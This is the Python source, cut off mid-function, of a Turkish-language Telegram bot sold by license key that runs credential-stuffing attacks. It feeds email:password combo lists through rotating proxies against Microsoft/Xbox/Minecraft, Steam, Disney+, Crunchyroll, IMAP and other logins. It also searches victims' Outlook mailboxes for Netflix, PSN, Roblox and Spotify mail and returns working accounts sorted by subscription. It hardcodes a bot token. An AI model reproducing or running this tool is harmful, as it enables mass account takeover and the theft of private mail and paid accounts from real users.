#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║          CHESTER ENTERPRISE BOT ALTYAPISI (v4.0 - XBOX INTEGRATED)   ║
║         Dinamik Proxy Havuzu, Çoklu Modül & Gelişmiş UI Tasarımı    ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import uuid
import json
import base64
import random
import string
import sqlite3
import imaplib
import threading
import itertools
import concurrent.futures
from datetime import datetime, timedelta
from urllib.parse import quote, quote_plus, unquote, urlparse, parse_qs

import requests
import urllib3
import warnings
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Güvenlik ve SSL uyarılarını kapat
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# --- KRİTİK KONFİGÜRASYONLAR ---
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
FOUNDER_ID = 8664147577  
DB_NAME = "chester_enterprise.db"

bot = telebot.TeleBot(BOT_TOKEN)

# --- GLOBAL KULLANICI AGENTLERİ ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36"
]
def get_random_ua(): return random.choice(USER_AGENTS)

# --- VERİTABANI BAŞLATICISI ---
def init_enterprise_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        role TEXT DEFAULT 'user',
        expire_date TEXT
    )""")
    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS keys (
        key_code TEXT PRIMARY KEY,
        duration_days INTEGER,
        status TEXT DEFAULT 'unused',
        created_by INTEGER
    )""")
    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy_str TEXT UNIQUE,
        proxy_type TEXT DEFAULT 'http'
    )""")
    
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username, role, expire_date) VALUES (?, ?, ?, ?)",
                   (FOUNDER_ID, "Founder_Chester", "founder", "2099-12-31 23:59:59"))
    
    conn.commit()
    conn.close()

init_enterprise_db()

# --- GÜVENLİ PROXY HAVUZU ---
class ThreadSafeProxyPool:
    def __init__(self):
        self.lock = threading.Lock()
        self.proxies = []         
        self.formatted_list = []  
        self.cycle_iterator = None
        self.reload_pool()

    def reload_pool(self):
        with self.lock:
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            cursor.execute("SELECT proxy_str, proxy_type FROM proxies")
            rows = cursor.fetchall()
            conn.close()
            
            self.proxies = rows
            self.formatted_list = []
            
            for proxy_str, proxy_type in rows:
                p_type = proxy_type.lower()
                clean_proxy = proxy_str.strip().replace('\r', '').replace('\n', '')
                if not clean_proxy:
                    continue
                if "://" in clean_proxy:
                    parsed = urlparse(clean_proxy)
                    clean_proxy = parsed.netloc
                
                formatted = {
                    "http": f"{p_type}://{clean_proxy}",
                    "https": f"{p_type}://{clean_proxy}"
                }
                self.formatted_list.append(formatted)
                
            if self.formatted_list:
                self.cycle_iterator = itertools.cycle(self.formatted_list)
            else:
                self.cycle_iterator = None

    def get_proxy(self):
        with self.lock:
            if not self.cycle_iterator:
                return None
            return next(self.cycle_iterator)

    def get_count(self):
        with self.lock:
            return len(self.formatted_list)

proxy_pool = ThreadSafeProxyPool()

# --- ÇALIŞMA ZAMANI DURUM TAKİBİ ---
active_sessions = {}
user_states = {}

class ScanRuntimeContext:
    def __init__(self, chat_id, total_combos, target_module):
        self.chat_id = chat_id
        self.total = total_combos
        self.module_name = target_module
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.retry = 0
        self.xgpu = 0
        self.xgp = 0
        self.other = 0
        self.start_time = time.time()
        self.is_running = True
        self.lock = threading.Lock()
        self.hits_output = []

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return int((self.checked / elapsed) * 60)
        return 0

def check_access(user_id):
    if user_id == FOUNDER_ID:
        return True, "founder"
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT role, expire_date FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if not row: return False, "guest"
    role, exp_str = row
    if role in ['founder', 'admin']: return True, role
    try:
        exp_date = datetime.strptime(exp_str, "%Y-%m-%d %H-%M-%S")
        if datetime.now() < exp_date: return True, role
    except: pass
    return False, "expired"

def is_privileged(user_id):
    if user_id == FOUNDER_ID: return True
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM users WHERE user_id = ? AND role IN ('founder', 'admin')", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return True if row else False

# ======================================================================
# CORE AUTH & MODÜL MOTORLARI
# ======================================================================

def core_microsoft_login(email, password, px_dict):
    try:
        s = requests.Session()
        s.verify = False
        if px_dict: s.proxies.update(px_dict)
            
        url1 = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1"
            f"&login_hint={quote(email)}"
            "&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        r1 = s.get(url1, headers={"User-Agent": get_random_ua()}, timeout=12)
        
        post_url, ppft = None, None
        for pat in [r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
            m = re.search(pat, r1.text)
            if m: post_url = m.group(1).replace("\\/", "/"); break
        for pat in [r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r'name="PPFT"[^>]*value="([^"]+)"']:
            m = re.search(pat, r1.text)
            if m: ppft = m.group(1); break
            
        if not post_url or not ppft: return {"status": "RETRY"}
            
        body = (
            f"i13=1&login={quote(email)}&loginfmt={quote(email)}"
            f"&type=11&LoginOptions=1&passwd={quote(password)}"
            f"&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1"
            "&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=9960"
        )
        r2 = s.post(post_url, data=body, headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":get_random_ua()}, allow_redirects=False, timeout=12)
        t = r2.text.lower()
        
        if "incorrect" in t or r2.text.count('"error"') > 2: return {"status": "BAD"}
        if any(x in t for x in ["identity/confirm","proofup","sms","authenticator","consent"]): return {"status": "2FA"}
        if "abuse" in t: return {"status": "BAD"}
            
        loc = r2.headers.get("Location", "")
        if not loc or "code=" not in loc: return {"status": "BAD"}
        code = re.search(r"code=([^&]+)", loc).group(1)
        cid = s.cookies.get("MSPCID", str(uuid.uuid4())).upper()
        
        r3 = s.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=(
                "client_info=1"
                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            ),
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            timeout=12
        )
        if "access_token" not in r3.text: return {"status": "BAD"}
        return {"status": "HIT", "token": r3.json()["access_token"], "cid": cid, "session": s}
    except:
        return {"status": "RETRY"}

def core_ms_search(session, token, cid, query):
    try:
        payload = {
            "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation", "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                "From": 0, "Query": {"QueryString": query}, "Size": 15, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        r = session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={
            "User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json", "Accept": "application/json"
        }, timeout=10)
        if r.status_code != 200: return []
        return r.json().get("EntitySets", [{}])[0].get("ResultSets", [{}])[0].get("Results", [])
    except: return []

# ======================================================================
# ADVANCED XBOX CHECKER MODULE ENGINE
# ======================================================================

def mod_xbox_checker(combo, px):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2: return "BAD", ""
        email = parts[0]
        password = ':'.join(parts[1:])
        
        s = requests.Session()
        s.verify = False
        if px: s.proxies.update(px)
        
        # SFTAG Alma Alanı
        url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        r1 = s.get(url, timeout=10)
        text = r1.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return "RETRY", ""
        sftag = match.group(1)
        
        match_url = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match_url: return "RETRY", ""
        url_post = match_url.group(1).replace("\\/", "/")
        
        # Microsoft Auth Alanı
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
        r2 = s.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        
        ms_token = None
        if '#' in r2.url and r2.url != url:
            ms_token = parse_qs(urlparse(r2.url).fragment).get('access_token', ["None"])[0]
        elif 'cancel?mkt=' in r2.text:
            try:
                data_cancel = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', r2.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', r2.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', r2.text).group()
                }
                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', r2.text).group()
                ret = s.post(action_url, data=data_cancel, allow_redirects=True, timeout=10)
                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                fin = s.get(return_url, allow_redirects=True, timeout=10)
                ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
            except: pass
            
        if any(value in r2.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return "2FA", f"{email}:{password} [2FA]"
        if any(value in r2.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account"]):
            return "BAD", ""
            
        if not ms_token or ms_token == "None": return "BAD", ""
        
        # Xbox Token
        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        r3 = s.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
        if r3.status_code != 200: return "BAD", ""
        data_xbox = r3.json()
        xbox_token = data_xbox.get('Token')
        uhs = data_xbox['DisplayClaims']['xui'][0]['uhs']
        
        # XSTS Token
        payload_xsts = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
        r4 = s.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload_xsts, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
        if r4.status_code != 200: return "BAD", ""
        xsts_token = r4.json().get('Token')
        
        # Minecraft Token
        r5 = s.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
        if r5.status_code != 200: return "BAD", ""
        mc_token = r5.json().get('access_token')
        
        # Entitlements Sınıflandırma
        r6 = s.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
        account_type = "None"
        if r6.status_code == 200:
            text_ent = r6.text
            if 'product_game_pass_ultimate' in text_ent: account_type = 'XGPU'
            elif 'product_game_pass_pc' in text_ent: account_type = 'XGP'
            elif '"product_minecraft"' in text_ent: account_type = 'Minecraft'
            else:
                others = []
                if 'product_minecraft_bedrock' in text_ent: others.append("Bedrock")
                if 'product_legends' in text_ent: others.append("Legends")
                if 'product_dungeons' in text_ent: others.append('Dungeons')
                account_type = 'Other: ' + ', '.join(others) if others else "No Entitlements"
                
        if account_type == "None" or account_type == "No Entitlements":
            return "BAD", ""
            
        # Profile Yakalama
        r7 = s.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
        name = "Not Set"
        if r7.status_code == 200:
            name = r7.json().get('name', 'N/A')
            
        return f"HIT_{account_type}", f"{email}:{password} | Type: {account_type} | Nick: {name}"
    except:
        return "RETRY", ""

# --- DİĞER DİNAMİK MODÜLLER ---
def mod_netflix(combo, px):
    try:
        email, password = combo.split(":", 1)
        res = core_microsoft_login(email, password, px)
        if res["status"] != "HIT": return res["status"], ""
        results = core_ms_search(res["session"], res["token"], res["cid"], "info@account.netflix.com OR netflix billing")
        if not results: return "BAD", ""
        full_text = " ".join([r.get("Preview","") + r.get("Subject","") for r in results]).lower()
        plan = "Member"
        if "premium" in full_text or "4k" in full_text: plan = "4K Premium"
        elif "standard" in full_text: plan = "Standard HD"
        return "HIT", f"{email}:{password} | Plan: {plan}"
    except: return "RETRY", ""

def mod_steam(combo, px):
    try:
        user, password = combo.split(":", 1)
        user_clean = re.sub(r"@.*", "", user)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        s.headers.update({"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"})
        r1 = s.post("https://steamcommunity.com/login/getrsakey/", data=f"donotcache={int(time.time())}&username={user_clean}", timeout=10)
        if not r1.json().get("success"): return "BAD", ""
        enc_pass = quote_plus(base64.b64encode(password.encode()).decode())
        payload = f"donotcache={int(time.time())}&password={enc_pass}&username={user_clean}&twofactorcode=&emailauth=&captchagid=-1"
        r2 = s.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=10)
        j2 = r2.json()
        if j2.get("requires_twofactor") or j2.get("emailauth_needed"): return "2FA", f"{user}:{password} [Steam 2FA]"
        if not j2.get("success"): return "BAD", ""
        return "HIT", f"{user}:{password} | SteamID: {j2.get('transfer_parameters',{}).get('steamid','?')}"
    except: return "RETRY", ""

def mod_crunchyroll(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False; abuse_block = ("ajcylfwdtjjtq7qpgks3", "")
        if px: s.proxies.update(px)
        payload = f"grant_type=password&username={quote(email)}&password={quote(password)}&scope=offline_access&device_id={str(uuid.uuid4())}&device_name=SM-G965F&device_type=samsung"
        r = s.post("https://beta-api.crunchyroll.com/auth/v1/token", data=payload, auth=abuse_block, headers={"User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"}, timeout=10)
        if r.status_code == 401: return "BAD", ""
        if "access_token" in r.text: return "HIT", f"{email}:{password} | Crunchyroll Premium"
        return "BAD", ""
    except: return "RETRY", ""

def mod_roblox(combo, px):
    try:
        email, password = combo.split(":", 1)
        res = core_microsoft_login(email, password, px)
        if res["status"] != "HIT": return res["status"], ""
        results = core_ms_search(res["session"], res["token"], res["cid"], "roblox.com OR noreply@roblox.com")
        if not results: return "BAD", ""
        full = " ".join([r.get("Preview","") for r in results]).lower()
        robux = re.search(r"(\d[\d,]+)\s*robux", full)
        robux_val = robux.group(1) if robux else "0"
        return "HIT", f"{email}:{password} | Robux: {robux_val}"
    except: return "RETRY", ""

def mod_psn(combo, px):
    try:
        email, password = combo.split(":", 1)
        res = core_microsoft_login(email, password, px)
        if res["status"] != "HIT": return res["status"], ""
        results = core_ms_search(res["session"], res["token"], res["cid"], "sony@txn-email.playstation.com OR PSN")
        if not results: return "BAD", ""
        full = " ".join([r.get("Subject","") for r in results]).lower()
        psplus = "Mevcut" if "playstation plus" in full or "essential" in full else "Yok"
        return "HIT", f"{email}:{password} | PS Plus: {psplus}"
    except: return "RETRY", ""

def mod_disney(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        reg_payload = {"operationName":"registerDevice","query":"mutation registerDevice($input:RegisterDeviceInput!){registerDevice(registerDevice:$input){grant{grantType,assertion}}}","variables":{"input":{"applicationRuntime":"browser","attributes":{"brand":"web","operatingSystem":"macOS"},"deviceFamily":"browser","deviceLanguage":"en-US","deviceProfile":"macosx"}}}
        r1 = s.post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql", json=reg_payload, headers={"authorization": "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"}, timeout=10)
        assertion = r1.json().get("extensions",{}).get("sdk",{}).get("token",{}).get("accessToken")
        login_payload = {"operationName":"loginViaEmail","query":"mutation loginViaEmail($input:LoginInput!){login(login:$input){actionGrant,account{profiles{name}}}}","variables":{"input":{"email":email,"password":password}}}
        r2 = s.post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql", json=login_payload, headers={"authorization": f"Bearer {assertion}"}, timeout=10)
        if "errors" in r2.text: return "BAD", ""
        profiles = r2.json().get("data",{}).get("login",{}).get("account",{}).get("profiles", [])
        return "HIT", f"{email}:{password} | Profil Sayısı: {len(profiles)}"
    except: return "RETRY", ""

def mod_supercell(combo, px):
    try:
        email, password = combo.split(":", 1)
        res = core_microsoft_login(email, password, px)
        if res["status"] != "HIT": return res["status"], ""
        results = core_ms_search(res["session"], res["token"], res["cid"], "supercell OR clash of clans OR brawl stars")
        if not results: return "BAD", ""
        return "HIT", f"{email}:{password} | Supercell Hesabı Bulundu"
    except: return "RETRY", ""

def mod_minecraft(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        live_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        r1 = s.get(live_url, headers={"User-Agent": get_random_ua()}, timeout=10)
        url_post = re.search(r'"urlPost":"([^"]+)"', r1.text).group(1).replace("\\/", "/")
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', r1.text).group(1)
        r2 = s.post(url_post, data={"login":email,"loginfmt":email,"passwd":password,"PPFT":ppft}, allow_redirects=True, timeout=10)
        if "access_token=" not in r2.url: return "BAD", ""
        token = parse_qs(urlparse(r2.url).fragment).get("access_token")[0]
        r3 = s.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com","RpsTicket":token},"RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"}, timeout=10)
        xbl = r3.json(); xbl_token = xbl.get("Token"); uhs = xbl.get("DisplayClaims",{}).get("xui",[{}])[0].get("uhs")
        r4 = s.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties":{"SandboxId":"RETAIL","UserTokens":[xbl_token]},"RelyingParty":"rp://api.minecraftservices.com/","TokenType":"JWT"}, timeout=10)
        xsts = r4.json().get("Token")
        r5 = s.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken":f"XBL3.0 x={uhs};{xsts}"}, timeout=10)
        mc_tok = r5.json().get("access_token")
        r6 = s.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization":f"Bearer {mc_tok}"}, timeout=10)
        if r6.status_code == 200: return "HIT", f"{email}:{password} | Nick: {r6.json().get('name','?')}"
        return "BAD", ""
    except: return "RETRY", ""

def mod_gora(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        bound = "----WebKitFormBoundaryChester"
        body = f"--{bound}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n--{bound}--\r\n"
        r = s.post("https://fenixoyun.com/giris", data=body, headers={"Content-Type": f"multipart/form-data; boundary={bound}"}, allow_redirects=False, timeout=10)
        if r.status_code in (301, 302) and "hesap" in r.headers.get("Location",""): return "HIT", f"{email}:{password}"
        return "BAD", ""
    except: return "RETRY", ""

def mod_anizium(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        p_str = json.dumps({"username": email, "password": password})
        out = [chr(ord(c) ^ ord("an1z1um_k3y_2024"[i % 16])) for i, c in enumerate(p_str)]
        enc = base64.b64encode("".join(out).encode("latin-1")).decode()
        r = s.post("https://api.anizium.co/user/login", data=f"d={quote(enc)}", headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
        if "success" in r.text or "token" in r.text: return "HIT", f"{email}:{password}"
        return "BAD", ""
    except: return "RETRY", ""

def mod_epinfy(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        r1 = s.get("https://epinfy.com/login", timeout=10)
        csrf = re.search(r'name="_token"\s+value="([^"]+)"', r1.text).group(1)
        r2 = s.post("https://epinfy.com/login", data={"email":email, "password":password, "_token":csrf}, timeout=10)
        if "dashboard" in r2.url or "hesabim" in r2.url: return "HIT", f"{email}:{password}"
        return "BAD", ""
    except: return "RETRY", ""

def mod_smsonay(combo, px):
    try:
        email, password = combo.split(":", 1)
        s = requests.Session(); s.verify = False
        if px: s.proxies.update(px)
        r1 = s.get("https://smsonay.com", timeout=10)
        csrf = re.search(r'_token.*?value="([^"]+)"', r1.text).group(1)
        r2 = s.post("https://smsonay.com/login", data={"email":email, "password":password, "_token":csrf}, timeout=10)
        if "dashboard" in r2.url: return "HIT", f"{email}:{password}"
        return "BAD", ""
    except: return "RETRY", ""

def mod_iptv(combo, px):
    try:
        host, user, password = combo.split(":", 2)
        if not host.startswith("http"): host = "http://" + host
        r = requests.get(f"{host}/player_api.php?username={user}&password={password}", proxies=px, timeout=8, verify=False)
        if r.status_code == 200 and r.json().get("user_info",{}).get("status") == "Active": return "HIT", f"{combo}"
        return "BAD", ""
    except: return "BAD", ""

def mod_spotify(combo, px):
    try:
        email, password = combo.split(":", 1)
        res = core_microsoft_login(email, password, px)
        if res["status"] != "HIT": return res["status"], ""
        results = core_ms_search(res["session"], res["token"], res["cid"], "no-reply@spotify.com")
        if not results: return "BAD", ""
        return "HIT", f"{email}:{password} | Spotify Bağlantılı"
    except: return "RETRY", ""

def mod_tiktok(combo, px):
    try:
        email, password = combo.split(":", 1)
        r = requests.get(f"http://37.221.93.104:8080/dudegeorgetrial?email={quote(email)}", proxies=px, timeout=8, verify=False)
        if r.status_code == 200 and r.json().get("status") == "registered": return "HIT", f"{email}:{password}"
        return "BAD", ""
    except: return "RETRY", ""

def mod_imap(combo, px):
    try:
        email, password = combo.split(":", 1)
        domain = email.split("@")[1].lower()
        IMAP_SERVERS = {"gmail.com":"imap.gmail.com","hotmail.com":"outlook.office365.com","outlook.com":"outlook.office365.com","yahoo.com":"imap.mail.yahoo.com"}
        host = IMAP_SERVERS.get(domain)
        if not host: return "BAD", ""
        conn = imaplib.IMAP4_SSL(host, 993, timeout=10)
        conn.login(email, password)
        conn.logout()
        return "HIT", f"{email}:{password}"
    except: return "BAD", ""

MODULE_DIRECTORY = {
    "xbox": mod_xbox_checker, "netflix": mod_netflix, "steam": mod_steam, 
    "crunchyroll": mod_crunchyroll, "roblox": mod_roblox, "psn": mod_psn, 
    "disney": mod_disney, "supercell": mod_supercell, "minecraft": mod_minecraft, 
    "gora": mod_gora, "anizium": mod_anizium, "epinfy": mod_epinfy, 
    "smsonay": mod_smsonay, "iptv": mod_iptv, "spotify": mod_spotify, 
    "tiktok": mod_tiktok, "imap": mod_imap
}

# ======================================================================
# PIPELINE WORKER VE LIVE STATS MOTORU
# ======================================================================

def core_pipeline_executor(chat_id, combos, module_key):
    context = ScanRuntimeContext(chat_id, len(combos), module_key)
    active_sessions[chat_id] = context
    
    msg = bot.send_message(chat_id, "⚙️ *Thread kümesi ayrıştırılıyor...*", parse_mode="Markdown")
    
    def live_updater():
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 Taramayı Durdur", callback_data="run_stop_scan"))
        while context.is_running and context.checked < context.total:
            try:
                if context.module_name == "xbox":
                    txt = (f"⚡ *CHESTER CENTRAL ENGINE (XBOX EDITION)*\n----------------------------------\n"
                           f"📂 Modül: `{context.module_name.upper()}`\n📊 İlerleme: `{context.checked}` / `{context.total}`\n\n"
                           f"🎯 Toplam HIT: `{context.hits}`\n👑 XGP Ultimate: `{context.xgpu}`\n🟢 XGP Regular: `{context.xgp}`\n"
                           f"💎 Minecraft: `{context.other}`\n❌ BAD: `{context.bad}`\n🔑 2FA: `{context.twofa}`\n"
                           f"🔄 RETRY: `{context.retry}`\n----------------------------------\n⚙️ Anlık CPM: `{context.get_cpm()}`")
                else:
                    txt = f"⚡ *CHESTER CENTRAL ENGINE AGENT*\n----------------------------------\n📂 Modül: `{context.module_name.upper()}`\n📊 İlerleme: `{context.checked}` / `{context.total}`\n\n🎯 HIT: `{context.hits}`\n❌ BAD: `{context.bad}`\n🔑 2FA: `{context.twofa}`\n🔄 RETRY: `{context.retry}`\n----------------------------------\n⚙️ Anlık CPM: `{context.get_cpm()}`"
                
                bot.edit_message_text(txt, chat_id=chat_id, message_id=msg.message_id, parse_mode="Markdown", reply_markup=kb)
            except: pass
            time.sleep(4)
            
    threading.Thread(target=live_updater, daemon=True).start()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
        func = MODULE_DIRECTORY[module_key]
        
        def single_job(combo):
            if not context.is_running: return
            px = proxy_pool.get_proxy()
            status, response_line = func(combo.strip(), px)
            
            with context.lock:
                context.checked += 1
                if status.startswith("HIT"):
                    context.hits += 1
                    if "XGPU" in status: context.xgpu += 1
                    elif "XGP" in status: context.xgp += 1
                    elif "Minecraft" in status: context.other += 1
                    
                    context.hits_output.append(response_line if response_line else combo)
                    bot.send_message(chat_id, f"🎯 *[HIT]* `{response_line if response_line else combo}`", parse_mode="Markdown")
                elif status == "2FA": context.twofa += 1
                elif status == "RETRY": context.retry += 1
                else: context.bad += 1
                
        futures = [executor.submit(single_job, c) for c in combos]
        concurrent.futures.wait(futures)
        
    context.is_running = False
    bot.send_message(chat_id, f"🏁 *Tarama Tamamlandı.*\n\nToplam: `{context.checked}`\nHIT: `{context.hits}`\n2FA: `{context.twofa}`")
    
    if context.hits_output:
        p = f"Hits_{chat_id}.txt"
        with open(p, "w", encoding="utf-8") as f: f.write("\n".join(context.hits_output))
        with open(p, "rb") as f_obj: bot.send_document(chat_id, f_obj, caption="🎯 Hits Sonuç Dosyası")
        os.remove(p)
        
    active_sessions.pop(chat_id, None)

# ======================================================================
# INTERFACE KEYBOARDS (PREMIUM UI LAYOUT)
# ======================================================================

def menu_main_keyboard(user_id):
    kb = InlineKeyboardMarkup(row_width=2).add(
        InlineKeyboardButton("🚀 Modül Seçimi", callback_data="nav_modules"),
        InlineKeyboardButton("📊 Durum Sorgula", callback_data="nav_my_status")
    )
    if is_privileged(user_id):
        kb.add(InlineKeyboardButton("🛡️ ADMİN KONTROL PANELİ", callback_data="adm_dashboard"))
    return kb

def menu_modules_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    # En üstte ve vurgulanmış şekilde Xbox modülü yer alıyor
    kb.add(InlineKeyboardButton("🔥 XBOX CHECKER 🔥", callback_data="modsel_xbox"))
    
    # Diğer modüller simetrik 3'lü satırlar halinde dizilir
    other_keys = [k for k in MODULE_DIRECTORY.keys() if k != "xbox"]
    buttons = [InlineKeyboardButton(k.upper(), callback_data=f"modsel_{k}") for k in other_keys]
    
    kb.add(*buttons)
    kb.add(InlineKeyboardButton("🔙 Ana Menü", callback_data="nav_home"))
    return kb

# ======================================================================
# COMMAND ROUTINES
# ======================================================================

@bot.message_handler(commands=['start'])
def cmd_start_handler(message):
    uid = message.from_user.id
    auth, role = check_access(uid)
    if not auth:
        bot.send_message(message.chat.id, "❌ *Erişim İzniniz Yok!*\n\nKayıt olmak için:\n`/register LİSANS_ANAHTARI`", parse_mode="Markdown")
        return
    bot.send_message(message.chat.id, f"🎭 *Chester Enterprise Workspace*\n\n*Rol:* `{role.upper()}`\nHavuzdaki Proxy: `{proxy_pool.get_count()}`", reply_markup=menu_main_keyboard(uid))

@bot.message_handler(commands=['register'])
def cmd_register_handler(message):
    uid = message.from_user.id
    tokens = message.text.split()
    if len(tokens) < 2:
        bot.reply_to(message, "⚠️ Kullanım: `/register KEY_KODU`", parse_mode="Markdown")
        return
    key_input = tokens[1].strip()
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
